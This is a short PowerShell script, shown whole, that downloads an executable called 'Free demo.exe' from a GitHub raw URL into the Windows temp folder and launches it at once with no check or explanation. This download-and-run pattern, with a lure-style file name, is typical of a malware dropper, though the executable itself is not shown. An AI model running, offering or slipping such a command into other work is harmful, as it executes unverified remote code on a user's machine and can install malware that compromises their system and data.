$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/180cri/refs/heads/main/Free demo.exe"
$file = "$env:TEMP\Free demo.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
